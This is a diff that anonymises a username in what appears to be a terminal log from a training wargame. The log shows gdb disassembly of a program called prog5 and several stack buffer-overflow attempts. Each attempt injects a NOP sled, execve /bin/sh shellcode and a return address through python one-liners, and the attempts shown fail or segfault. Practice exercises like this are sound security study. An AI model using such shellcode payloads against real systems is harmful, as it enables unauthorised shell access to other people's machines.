@@ -1,4 +1,4 @@
-husky026@bandit:~$ gdb prog5
+username@bandit:~$ gdb prog5
 (gdb) disas main
 Dump of assembler code for function main:
    0x56555784 <+0>:     lea    0x4(%esp),%ecx
@@ -290,8 +290,8 @@ Breakpoint 2, 0x5655581f in main ()
 Continuing.
 [Inferior 1 (process 29583) exited normally]
 (gdb) quit
-husky026@bandit:~$ gdb prog5^C
-husky026@bandit:~$ /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
+username@bandit:~$ gdb prog5^C
+username@bandit:~$ /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
 x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
 Hello, what is the magic word?: You said ����������������������������������������������
 ������������������������������������������������������������������������
@@ -303,7 +303,7 @@ Hello, what is the magic word?: You said �������������
 �Ph/shh/bie��PS���°
                            P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
-husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
+username@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
 x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
 Hello, what is the magic word?: You said ����������������������������������������������
 ������������������������������������������������������������������������
@@ -316,7 +316,7 @@ Hello, what is the magic word?: You said �������������
                                1�@P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 Segmentation fault
-husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
+username@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
 x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
 Hello, what is the magic word?: You said ����������������������������������������������
 ������������������������������������������������������������������������
